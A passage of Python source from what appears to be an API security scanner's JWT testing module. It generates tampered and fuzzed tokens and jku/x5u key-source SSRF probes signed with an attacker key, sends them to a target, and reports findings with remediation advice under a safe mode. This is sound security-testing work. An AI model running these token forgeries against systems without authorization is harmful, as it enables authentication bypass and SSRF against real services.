        (Req 64.4): that vector drops ``exp``/``iat`` entirely whereas this one
        re-signs a token carrying a tampered time claim.
        """
        key = self._signing_key()
        now = int(time.time())
        past = now - 3600                    # one hour ago
        far_future = now + 60 * 60 * 24 * 3650  # ~10 years ahead
        future = now + 3600                  # one hour ahead

        # Each variant modifies only the single targeted time claim; every other
        # component is inherited from the untouched base header/payload.
        variants = [
            ('exp', past),
            ('exp', far_future),
            ('nbf', future),
            ('iat', future),
        ]

        tokens: List[str] = []
        for claim, value in variants:
            header = self._base_header()
            payload = self._base_payload()
            payload[claim] = value
            try:
                tokens.append(encode_jwt(header, payload, key))
            except Exception as e:
                self.logger.debug("timestamp tamper encode failed",
                                  claim=claim, value=value, error=str(e))
        return tokens

    def _generate_claim_fuzzing(self) -> List[str]:
        """CLAIM_FUZZING: substitute the operator-named claim/header per value.

        For the configured ``fuzz_target`` (a claim or header name) and
        ``fuzz_values`` (typically read from a Vector_File), builds ONE token per
        value that substitutes only that named claim/header with the value and
        preserves every other token component unchanged, re-signing with the
        current signing key (Req 63.1). When ``fuzz_target`` names an existing
        header field the value is substituted in the header; otherwise it is
        treated as a payload claim. Returns ``[]`` when no target or no values
        were supplied.
        """
        if not self.fuzz_target or not self.fuzz_values:
            return []

        key = self._signing_key()
        target_is_header = self.fuzz_target in self._base_header()

        tokens: List[str] = []
        for value in self.fuzz_values:
            header = self._base_header()
            payload = self._base_payload()
            if target_is_header:
                header[self.fuzz_target] = value
            else:
                payload[self.fuzz_target] = value
            try:
                tokens.append(encode_jwt(header, payload, key))
            except Exception as e:
                self.logger.debug("claim fuzzing encode failed",
                                  fuzz_target=self.fuzz_target,
                                  value=value, error=str(e))
        return tokens

    def generate_all_tokens(self) -> Dict[AttackType, List[str]]:
        """Generate tokens for every ``AttackType`` (convenience helper)."""
        return {attack_type: self.generate_token(attack_type)
                for attack_type in AttackType}

    # ------------------------------------------------------------------
    # Sensitive-data-in-payload inspection (Requirement 43)
    # ------------------------------------------------------------------
    def _sensitivity_inspector(self):
        """Return a reusable Property_Module instance for Req-12 corroboration.

        The corroboration discipline (a credential/PII pattern match is
        necessary-but-not-sufficient; it must be corroborated by a sensitive
        field name, a known credential prefix, or a high-entropy check) lives in
        :meth:`PropertyLevelAuthModule._contains_sensitive_data`. It is REUSED
        here rather than reimplemented (Req 43.2): a bare instance is created via
        ``__new__`` (the corroboration helpers rely only on class-level
        constants/static methods, so no config or HTTP client is required).
        """
        if self._sensitivity_module is None:
            from modules.owasp.property_level_auth import PropertyLevelAuthModule
            self._sensitivity_module = PropertyLevelAuthModule.__new__(
                PropertyLevelAuthModule)
        return self._sensitivity_module

    def _redactor(self):
        """Return a reusable BOLA_Module instance for secret redaction.

        The redaction logic lives in :meth:`BOLATestingModule.redact_secrets`
        and is REUSED here (Req 43.4) rather than recreated, mirroring how the
        Auth_Module reuses it. A bare instance is created via ``__new__`` because
        ``redact_secrets`` depends only on class-level constants.
        """
        if self._secret_redactor is None:
            from modules.owasp.bola_testing import BOLATestingModule
            self._secret_redactor = BOLATestingModule.__new__(BOLATestingModule)
        return self._secret_redactor

    def _corroborate_sensitive_claim(self, field: str, value: Any) -> Optional[str]:
        """Return the sensitivity type of a claim only when corroborated (Req 43.2).

        Reuses the Property_Module's Req-12 corroboration discipline: a
        credential/PII pattern match is necessary but not sufficient — the claim
        is confirmed only when the match is corroborated by a sensitive field
        name, a known credential prefix (e.g. ``sk_``), or a high-entropy check.
        A bare pattern match with no corroboration returns ``None`` (not
        flagged).

        Args:
            field: The claim's field name (threaded in as corroborating evidence).
            value: The claim's value.

        Returns:
            The sensitivity type string (e.g. ``'password'``, ``'api_key'``,
            ``'personal_data'``) when the claim is confirmed sensitive, otherwise
            ``None``.
        """
        # Only string claim values carry the credential/PII shapes the
        # corroboration discipline reasons about; non-string claims (numbers,
        # booleans, nested structures) are not flagged.
        if not isinstance(value, str):
            return None

        inspector = self._sensitivity_inspector()

        # Necessary-but-not-sufficient: _contains_sensitive_data returns True
        # only when a pattern match is corroborated (Req 12.2 / Req 43.2).
        if not inspector._contains_sensitive_data(value, field_name=field):
            return None

        # Prefer the field-name-derived sensitivity type when the field name is
        # itself a recognized sensitive field; otherwise derive it from the value.
        if field and inspector._is_sensitive_field(str(field).lower()):
            return inspector._get_sensitivity_type(str(field).lower())
        return inspector._detect_value_sensitivity_type(value)

    def _redact_claim_value(self, field: str, value: Any) -> str:
        """Redact a flagged claim value so the secret is never echoed (Req 43.4).

        Runs the value through the reused :meth:`BOLATestingModule.redact_secrets`
        helper. As a defensive backstop for values that the credential-shape
        redactor does not itself rewrite (for example lone PII such as an email
        address), the value is force-replaced with the redaction marker if it
        survives verbatim, guaranteeing the raw value is never emitted.
        """
        redactor = self._redactor()
        raw = str(value)
        try:
            # Present the claim in a credential-named-field form so the
            # field-aware redaction rules engage as well as the bare-token rule.
            redacted_snippet = redactor.redact_secrets(f'"{field}": "{raw}"')
            redacted_value = redactor.redact_secrets(raw)
        except Exception:
            redacted_snippet = ""
            redacted_value = redactor.REDACTION_MARKER

        marker = getattr(redactor, 'REDACTION_MARKER', '<redacted>')
        # Guarantee the raw value never survives verbatim in the output.
        if raw and (raw in redacted_value or raw in redacted_snippet):
            return marker
        return redacted_value

    def inspect_payload_sensitivity(self, token: str,
                                    scan_id: str = "") -> List[Finding]:
        """Inspect a JWT payload for sensitive claims (Requirement 43).

        Decodes the payload and inspects each claim for sensitive data —
        passwords, credentials, symmetric keys, and PII (Req 43.1). A
        credential/PII pattern match is necessary but not sufficient; a claim is
        flagged only when :meth:`_corroborate_sensitive_claim` confirms it
        (Req 43.2). Each confirmed claim yields a ``JWT_SENSITIVE_DATA_IN_PAYLOAD``
        finding (OWASP_Category API2) that includes the offending field name and
        the sensitivity type (Req 43.3), with the value passed through the reused
        ``redact_secrets`` helper so the secret is never echoed (Req 43.4).

        An undecodable payload is treated as "no sensitive claims" rather than
        raising, so a malformed token never produces a false positive.

        Args:
            token: The JWT whose payload is inspected.
            scan_id: The scan identifier stamped on each finding.

        Returns:
            The list of ``JWT_SENSITIVE_DATA_IN_PAYLOAD`` findings (possibly empty).
        """
        try:
            decoded = decode_jwt(token)
            payload = decoded.get('payload')
        except Exception as e:
            self.logger.debug("Payload sensitivity inspection skipped; "
                              "undecodable token", error=str(e))
            return []

        if not isinstance(payload, dict):
            return []

        findings: List[Finding] = []
        for field, value in payload.items():
            sensitivity_type = self._corroborate_sensitive_claim(field, value)
            if sensitivity_type is None:
                continue

            redacted_value = self._redact_claim_value(field, value)
            findings.append(Finding(
                id=str(uuid.uuid4()),
                scan_id=scan_id,
                category="JWT_SENSITIVE_DATA_IN_PAYLOAD",
                owasp_category=JWT_OWASP_CATEGORY,
                severity=Severity.MEDIUM,
                endpoint=self.target_url,
                method="ANALYSIS",
                status_code=0,
                response_size=0,
                response_time=0.0,
                evidence=(
                    f"JWT payload claim '{field}' carries sensitive data "
                    f"(sensitivity type: {sensitivity_type}). "
                    f"Value (redacted): {redacted_value}"
                ),
                recommendation=(
                    "Do not carry secrets or PII in JWT payload claims; the "
                    "payload is only base64url-encoded, not encrypted. Move "
                    "sensitive data server-side and reference it by an opaque id."
                ),
                payload=f"Field: {field}",
            ))
            self.logger.warning("Sensitive data detected in JWT payload",
                                field=field, sensitivity_type=sensitivity_type)

        return findings

    # ------------------------------------------------------------------
    # kid injection success confirmation (Requirement 44)
    # ------------------------------------------------------------------
    async def _confirm_kid_injection(
            self, attack_result: Optional[AttackResult]) -> bool:
        """Confirm KID_Injection success via evidence (Requirement 44.2).

        Reuses the :class:`JWTAttackResponseAnalyzer` assessment carried on the
        attack result: success is confirmed only when the analyzer flagged the
        response as vulnerable (baseline comparison / acceptance of a token
        signed with the forced predictable key), never from mere payload
        submission. A confirmed result maps to a ``JWT_KID_INJECTION`` finding
        (API2) via :func:`jwt_assessment_to_finding` (Req 44.3).

        Args:
            attack_result: The KID_INJECTION result produced by
                :meth:`execute_attack`, already evaluated through the analyzer.

        Returns:
            ``True`` when the injection is confirmed vulnerable, else ``False``.
        """
        if attack_result is None:
            return False
        assessment = attack_result.vulnerability_assessment
        return bool(assessment and assessment.is_vulnerable)

    # ------------------------------------------------------------------
    # jku / x5u key-source SSRF + allowlist assessment (Requirement 45)
    # ------------------------------------------------------------------
    def _build_jku_x5u_token(self, header_field: str, key_source_url: str) -> str:
        """Build a token whose ``jku``/``x5u`` header points at an attacker key source.

        Only the targeted header field (``jku`` or ``x5u``) is set to
        ``key_source_url``; every other header field and the entire payload are
        preserved unchanged (Requirement 45.1). The header-construction integrity
        is the same one exercised by ``_generate_jwks_spoof`` and covered by
        Property 25 (Task 29.3) — this method reuses that exact construction
        pattern (deep-copied base header, single targeted field, untouched
        payload) rather than duplicating it.

        The token is signed with an attacker-controlled key
        (:data:`_ATTACKER_KEY_SOURCE_SECRET`) representing the signing material
        the attacker publishes at ``key_source_url``. A server that fetches that
        attacker-controlled key source (SSRF) and validates the signature against
        it will accept the token; the server's real key would never validate this
        attacker-signed token, so acceptance is unambiguous proof of the
        vulnerability (Requirement 45.2).
        """
        if header_field not in ('jku', 'x5u'):
            raise ValueError("header_field must be 'jku' or 'x5u'")
        header = self._base_header()
        header[header_field] = key_source_url
        payload = self._base_payload()
        return encode_jwt(header, payload, _ATTACKER_KEY_SOURCE_SECRET)

    def _assess_key_source_allowlist(self, header_field: str, key_source_url: str,
                                     accepted: bool,
                                     outbound_observed: bool) -> Dict[str, Any]:
        """Assess whether the jku/x5u key-source domain is constrained by an allowlist.

        Reports whether the attacker-controlled key-source domain appears
        constrained by an allowlist, returned as structured evidence attached to
        the finding (Requirement 45.5).

        The determination is drawn from the observed outcome of the probe:

        * If the attacker key source was HONORED — either the attacker-signed
          token was accepted (Req 45.2) or an outbound request to the attacker
          URL was observed (Req 45.3) — the domain is NOT constrained by an
          allowlist (``allowlisted=False``).
        * Otherwise the single negative probe cannot prove an allowlist exists,
          so the domain merely APPEARS constrained (``allowlisted=None``): no
          acceptance and no observed outbound request were seen.

        Returns:
            ``{'allowlisted': bool|None, 'domain': str, 'evidence': str}``.
        """
        domain = urlparse(key_source_url).netloc or key_source_url
        honored = bool(accepted or outbound_observed)
        if honored:
            allowlisted = False
            evidence = (
                f"Key-source allowlist assessment: the '{header_field}' key-source "
                f"domain '{domain}' is NOT constrained by an allowlist — the "
                f"attacker-controlled key source was honored "
                f"({'attacker-signed token accepted' if accepted else 'outbound request observed'})."
            )
        else:
            allowlisted = None
            evidence = (
                f"Key-source allowlist assessment: the '{header_field}' key-source "
                f"domain '{domain}' appears constrained by an allowlist — the "
                f"attacker-controlled key source was not honored on this probe "
                f"(no attacker-signed-token acceptance and no observed outbound request)."
            )
        return {"allowlisted": allowlisted, "domain": domain, "evidence": evidence}

    async def _observe_key_source(self, observer, key_source_url: str) -> bool:
        """Query the optional out-of-band observer for a target outbound request.

        ``observer`` models an attacker-controlled key-source / interaction
        collaborator: when supplied it is called with ``key_source_url`` and
        reports whether the target issued an outbound request to that URL
        (Requirement 45.3). Both synchronous and awaitable observers are
        supported. An absent observer, or one that raises, yields ``False`` (no
        outbound request observed) so the probe degrades gracefully rather than
        crashing the scan.
        """
        if observer is None:
            return False
        try:
            result = observer(key_source_url)
            if inspect.isawaitable(result):
                result = await result
            return bool(result)
        except Exception as e:
            self.logger.debug("Key-source observer failed",
                              key_source_url=key_source_url, error=str(e))
            return False

    def _build_jku_ssrf_finding(self, *, header_field: str, key_source_url: str,
                                token: str, accepted: bool, outbound_observed: bool,
                                assessment: Optional[VulnerabilityAssessment],
                                response_details: Optional[ResponseDetails],
                                allowlist: Dict[str, Any],
                                scan_id: str) -> Finding:
        """Build the ``JWT_JKU_SSRF`` finding for a confirmed jku/x5u SSRF.

        Emitted only once confirmation is gated (Req 45.2 / 45.3). Evidence names
        the targeted header, the attacker key source, the confirmation basis, the
        key-source allowlist assessment (Req 45.5), and — when a response was
        analyzed — the analyzer evidence, baseline comparison, and confidence
        score (consistent with Req 19.3). ``owasp_category='API2'`` (Req 45.2 /
        45.3).
        """
        if accepted:
            basis = (
                f"Confirmed: the API accepted a token signed with attacker-hosted "
                f"keys referenced by the '{header_field}' header — a spoofed-key "
                f"acceptance (Requirement 45.2)."
            )
        else:
            basis = (
                f"Confirmed: an outbound request to the attacker-controlled key "
                f"source referenced by the '{header_field}' header was observed "
                f"(Requirement 45.3)."
            )

        evidence_lines: List[str] = [
            f"jku/x5u key-source SSRF: the '{header_field}' header pointed at the "
            f"attacker-controlled key source '{key_source_url}'.",
            basis,
            allowlist["evidence"],
        ]

        confidence = None
        if assessment is not None:
            evidence_lines.extend(assessment.evidence)
            confidence = assessment.confidence_score

        status_code = 0
        response_size = 0
        response_time = 0.0
        if response_details is not None:
            status_code = response_details.status_code
            response_size = response_details.content_length
            response_time = response_details.response_time
            baseline_comparison = self._compare_with_baseline(response_details)
            if baseline_comparison:
                evidence_lines.append(
                    "Baseline comparison: "
                    f"status {baseline_comparison.get('baseline_status')} -> "
                    f"{baseline_comparison.get('attack_status')} "
                    f"(status_code_diff={baseline_comparison.get('status_code_diff')}, "
                    f"content_length_diff={baseline_comparison.get('content_length_diff')}, "
                    f"response_time_diff={baseline_comparison.get('response_time_diff')})"
                )
        if confidence is not None:
            evidence_lines.append(f"Confidence score: {confidence}")

        method = self._resolve_method()
        token_preview = token[:50] + "..." if len(token) > 50 else token

        return Finding(
            id=str(uuid.uuid4()),
            scan_id=scan_id,
            category=JWT_JKU_SSRF_CATEGORY,
            owasp_category=JWT_OWASP_CATEGORY,
            severity=Severity.HIGH,
            endpoint=self.target_url,
            method=method,
            status_code=status_code,
            response_size=response_size,
            response_time=response_time,
            evidence="\n".join(evidence_lines),
            recommendation=(
                "Constrain JWT key sources to a strict allowlist of trusted "
                "domains. Never fetch signature-verification keys from a "
                "jku/x5u URL supplied in the token header, and reject tokens "
                "whose key source is not on the allowlist."
            ),
            payload=token_preview,
        )

    async def test_key_source_ssrf(self, attacker_key_source_url: str,
                                   key_source_observer=None,
                                   scan_id: str = "") -> List[Finding]:
        """Detect jku/x5u key-source SSRF (Requirement 45).

        Builds a token referencing ``attacker_key_source_url`` in the ``jku`` and
        then the ``x5u`` header, each signed with attacker-hosted keys (Req 45.1),
        and issues it through the shared :class:`HTTPRequestEngine` honoring Safe
        Mode (Req 45.4, consistent with Req 17). A finding is confirmed ONLY via
        one of two gates:

        * (a) the API accepts the attacker-signed token — detected through the
          single success detector :class:`JWTAttackResponseAnalyzer` against the
          established baseline (Req 45.2); OR
        * (b) an outbound request to the attacker-controlled key source is
          observed via the optional ``key_source_observer`` collaborator
          (Req 45.3).

        Neither mere submission of the token nor a failed key-source fetch is
        ever treated as success. Each confirmed probe emits a ``JWT_JKU_SSRF``
        finding (OWASP_Category API2); the acceptance path is a spoofed-key
        acceptance that may equivalently be reported under ``JWT_JWKS_SPOOF``
        (also API2). Every finding carries the key-source allowlist assessment as
        evidence (Req 45.5).

        Args:
            attacker_key_source_url: The attacker-controlled jku/x5u key-source URL.
            key_source_observer: Optional callable (sync or awaitable) taking the
                key-source URL and returning whether the target issued an outbound
                request to it (models an out-of-band interaction collaborator).
            scan_id: The scan identifier stamped on each finding.

        Returns:
            The list of confirmed ``JWT_JKU_SSRF`` findings (possibly empty).
        """
        await self._establish_baseline()
        method = self._resolve_method()
        findings: List[Finding] = []

        for header_field in ('jku', 'x5u'):
            token = self._build_jku_x5u_token(header_field, attacker_key_source_url)

            assessment: Optional[VulnerabilityAssessment] = None
            response_details: Optional[ResponseDetails] = None
            accepted = False
            try:
                response = await self._issue(token, method)
            except Exception as e:
                # A failed key-source fetch/probe maps to "not vulnerable / no
                # outbound observed" rather than crashing the scan.
                self.logger.debug("jku/x5u SSRF request failed",
                                  header_field=header_field, error=str(e))
                response = None

            if response is not None:
                response_details = self._to_response_details(response)
                # JWTAttackResponseAnalyzer is the single success detector
                # (Req 19.1); JWKS_SPOOF is the closest attack semantics.
                assessment = self.response_analyzer.analyze_attack_response(
                    response_details, AttackType.JWKS_SPOOF)
                accepted = bool(assessment.is_vulnerable)

            outbound_observed = await self._observe_key_source(
                key_source_observer, attacker_key_source_url)

            # Confirm ONLY via attacker-signed-token acceptance OR an observed
            # outbound request; nothing else confirms a finding (Req 45.2/45.3).
            if not (accepted or outbound_observed):
                self.logger.info(
                    "No jku/x5u SSRF confirmed for header field",
                    header_field=header_field,
                    key_source_url=attacker_key_source_url)
                continue

            allowlist = self._assess_key_source_allowlist(
                header_field, attacker_key_source_url, accepted, outbound_observed)

            self.logger.warning(
                "jku/x5u key-source SSRF confirmed",
                header_field=header_field,
                key_source_url=attacker_key_source_url,
                accepted=accepted,
                outbound_observed=outbound_observed,
                allowlisted=allowlist["allowlisted"])

            findings.append(self._build_jku_ssrf_finding(
                header_field=header_field,
                key_source_url=attacker_key_source_url,
                token=token,
                accepted=accepted,
                outbound_observed=outbound_observed,
                assessment=assessment,
                response_details=response_details,
                allowlist=allowlist,
                scan_id=scan_id,
            ))

        return findings

    # ------------------------------------------------------------------
    # HTTP execution through the shared engine (Requirement 17)
    # ------------------------------------------------------------------
    def _resolve_method(self) -> str:
        """Select the HTTP method, honoring Safe Mode (Requirement 17.2).

        POST is used when a body is present, otherwise GET. Under Safe Mode a
        state-changing method is downgraded to GET so attack requests are
        restricted to Safe_Methods.
        """
        method = "POST" if self.post_data else "GET"
        if self.safe_mode and method.upper() not in SAFE_METHODS:
            self.logger.info(
                "Restricting JWT attack request to a safe method in safe mode",
                requested_method=method, effective_method="GET")
            return "GET"
        return method

    def _build_headers(self, token: str) -> Dict[str, str]:
        headers = {
            'Authorization': f'Bearer {token}',
            'Accept': 'application/json',
        }
        headers.update(self.custom_headers)
        return headers

    async def _issue(self, token: str, method: str):
        """Issue a single request through the shared HTTPRequestEngine."""
        headers = self._build_headers(token)
        kwargs: Dict = {'headers': headers}
        if self.post_data and method.upper() in ('POST', 'PUT', 'PATCH'):
            try:
                kwargs['json'] = json.loads(self.post_data)
            except (json.JSONDecodeError, ValueError):
                kwargs['data'] = self.post_data
        return await self.http_engine.request(method, self.target_url, **kwargs)

    @staticmethod
    def _to_response_details(response) -> ResponseDetails:
        """Adapt an ``HTTPRequestEngine`` Response into ``ResponseDetails``."""
        content = getattr(response, 'content', b'') or b''
        return ResponseDetails(
            status_code=getattr(response, 'status_code', 0),
            headers=dict(getattr(response, 'headers', {}) or {}),
            body=getattr(response, 'text', '') or '',
            response_time=getattr(response, 'elapsed', 0.0) or 0.0,
            content_length=len(content),
        )

    def _compare_with_baseline(self, response_details: ResponseDetails) -> Dict:
        if not self.baseline_response:
            return {}
        baseline = self.baseline_response.response_details
        return {
            'status_code_diff': response_details.status_code - baseline.status_code,
            'content_length_diff': response_details.content_length - baseline.content_length,
            'response_time_diff': response_details.response_time - baseline.response_time,
            'baseline_status': baseline.status_code,
            'attack_status': response_details.status_code,
        }

    async def _establish_baseline(self) -> None:
        """Issue the original token once and initialize the response analyzer."""
        if self.baseline_response is not None:
            return

        method = self._resolve_method()
        response = await self._issue(self.original_token, method)
        response_details = self._to_response_details(response)
        request_details = RequestDetails(
            url=self.target_url,
            method=method,
            headers=self._build_headers(self.original_token),
            body=self.post_data,
        )
        self.baseline_response = BaselineResponse(
            request_details=request_details,
            response_details=response_details,
        )
        # JWTAttackResponseAnalyzer is the single success detector (Req 19.1).
        self.response_analyzer = JWTAttackResponseAnalyzer(self.baseline_response)
        self.logger.info("Baseline established",
                         status_code=response_details.status_code)

    def _attack_succeeded(self, assessment: Optional[VulnerabilityAssessment],
                          response_body) -> bool:
        """Decide whether an attack variant succeeded (Reqs 67.3-67.5).

        The analyzer's ``is_vulnerable`` flag is the SOLE determinant of
        success. An optional operator-supplied ``canary_value`` may only
        CORROBORATE an already-successful result — it never promotes a
        non-success into a success.

        * Returns ``False`` when ``assessment`` is ``None`` or
          ``assessment.is_vulnerable`` is ``False``. A canary match never turns
          a non-success into a success (Req 67.4).
        * Returns ``True`` when ``assessment.is_vulnerable`` is ``True``.
          Additionally, when ``self.canary_value`` is set AND the canary appears
          in ``response_body``, a corroborating evidence line is appended to
          ``assessment.evidence`` exactly once (idempotent across repeated
          calls) — Req 67.3.
        * When no canary is supplied (``None``/empty), the return value is
          exactly the analyzer result and no evidence is appended — existing
          behavior is preserved (Req 67.5).

        Guards against a ``None``/non-``str`` ``response_body``.
        """
        if assessment is None or not assessment.is_vulnerable:
            return False

        canary = self.canary_value
        if canary and isinstance(response_body, str) and canary in response_body:
            corroboration = (
                f"Canary value '{canary}' present in response — "
                "corroborates success."
            )
            # Append idempotently so repeated calls do not duplicate evidence.
            if corroboration not in assessment.evidence:
                assessment.evidence.append(corroboration)

        return True

    async def execute_attack(self, attack_type: AttackType) -> Optional[AttackResult]:
        """Generate and execute a single attack vector.

        Issues every generated variant through the shared engine and returns an
        :class:`AttackResult` for the vector, stopping early on the first
        variant the analyzer flags as vulnerable. Returns ``None`` when no token
        could be generated or no request produced a response.
        """
        await self._establish_baseline()

        tokens = self.generate_token(attack_type)
        if not tokens:
            self.logger.warning("No attack tokens generated",
                                attack_type=attack_type.value)
            return None

        method = self._resolve_method()
        result: Optional[AttackResult] = None

        for token in tokens:
            try:
                response = await self._issue(token, method)
            except Exception as e:
                self.logger.debug("Attack request failed",
                                  attack_type=attack_type.value, error=str(e))
                continue

            response_details = self._to_response_details(response)
            assessment = self.response_analyzer.analyze_attack_response(
                response_details, attack_type)

            result = AttackResult(
                attack_type=attack_type,
                attack_variant="standard",
                jwt_token=token,
                request_details=RequestDetails(
                    url=self.target_url,
                    method=method,
                    headers=self._build_headers(token),
                    body=self.post_data,
                ),
                response_details=response_details,
                vulnerability_assessment=assessment,
                baseline_comparison=self._compare_with_baseline(response_details),
            )

            if self._attack_succeeded(assessment, response_details.body):
                # Analyzer flagged this variant as vulnerable; the canary (when
                # supplied and present) has appended corroborating evidence.
                break

        return result

    async def execute_all(self) -> AttackSummary:
        """Execute every ``AttackType`` vector and return an :class:`AttackSummary`."""
        self.logger.info("Starting JWT attack execution across all vectors")
        self._initialize_session()
        await self._establish_baseline()

        self.attack_results = []
        for attack_type in AttackType:
            try:
                result = await self.execute_attack(attack_type)
            except Exception as e:
                self.logger.error("Attack vector failed",
                                  attack_type=attack_type.value, error=str(e))
                continue

            if result is None:
                continue

            self.attack_results.append(result)
            self.session.total_attacks += 1
            if result.vulnerability_assessment.is_vulnerable:
                self.session.successful_attacks += 1

        self.session.end_time = datetime.now()
        self.session.attack_results = self.attack_results
        summary = self._generate_summary()

        self.logger.info("JWT attack execution completed",
                         total_attacks=self.session.total_attacks,
                         successful_attacks=self.session.successful_attacks,
                         vulnerabilities_found=len(summary.vulnerabilities_found))
        return summary

    def _initialize_session(self) -> None:
        config = AttackConfiguration(
            target_url=self.target_url,
            original_jwt=self.original_token,
            custom_headers=self.custom_headers,
            post_data=self.post_data,
            attack_vectors=list(AttackType),
        )
        session_id = str(uuid.uuid4())
        config.session_id = session_id
        self.session = AttackSession(session_id=session_id, configuration=config)

    def _generate_summary(self) -> AttackSummary:
        vulnerabilities_found: List[AttackResult] = []
        potential_vulnerabilities: List[AttackResult] = []
        failed_attacks: List[AttackResult] = []

        for result in self.attack_results:
            assessment = result.vulnerability_assessment
            if assessment.is_vulnerable:
                if assessment.confidence_score >= 0.7:
                    vulnerabilities_found.append(result)
                else:
                    potential_vulnerabilities.append(result)
            else:
                failed_attacks.append(result)

        return AttackSummary(
            session=self.session,
            vulnerabilities_found=vulnerabilities_found,
            potential_vulnerabilities=potential_vulnerabilities,
            failed_attacks=failed_attacks,
        )

    # ------------------------------------------------------------------
    # JWT -> unified findings (Requirement 18)
    # ------------------------------------------------------------------
    def _no_findings_result(self, scan_id: str) -> Finding:
        """Build the INFO finding confirming a JWT scan executed with no findings.

        Emitted when a scan finds no JWT vulnerabilities (Requirement 18.2). The
        ``JWT_SCAN_COMPLETED_NO_FINDINGS`` category resolves to INFO / API2 in
        :class:`~utils.findings.FindingsCollector`.
        """
        return Finding(
            id=str(uuid.uuid4()),
            scan_id=scan_id,
            category=JWT_NO_FINDINGS_CATEGORY,
            owasp_category=JWT_OWASP_CATEGORY,
            severity=Severity.INFO,
            endpoint=self.target_url,
            method="ANALYSIS",
            status_code=0,
            response_size=0,
            response_time=0.0,
            evidence="JWT attack scan completed; no JWT vulnerabilities detected.",
            recommendation="No action required for JWT attack vectors.",
        )

    def to_findings(self, summary: AttackSummary, scan_id: str = "") -> List[Finding]:
        """Map an :class:`AttackSummary` to unified :class:`Finding` objects.

        Each detected vulnerability (confirmed or potential) is mapped to a
        Finding via :func:`jwt_assessment_to_finding` (Requirement 18.4), with
        severity reconciled through ``_SEVERITY_MAP`` (Req 18.1) and
        ``owasp_category='API2'`` (Req 18.3). When no vulnerabilities are found,
        a single ``JWT_SCAN_COMPLETED_NO_FINDINGS`` (INFO) finding is emitted to
        confirm the scan executed (Requirement 18.2).

        Args:
            summary: The attack summary produced by :meth:`execute_all`.
            scan_id: The scan identifier stamped on each finding. Defaults to an
                empty string so a :class:`~utils.findings.FindingsCollector` can
                assign the active scan id, mirroring the other OWASP modules.

        Returns:
            The list of findings to emit into the unified pipeline.
        """
        detected = list(summary.vulnerabilities_found) + list(summary.potential_vulnerabilities)
        if not detected:
            return [self._no_findings_result(scan_id)]

        return [jwt_assessment_to_finding(result, scan_id) for result in detected]
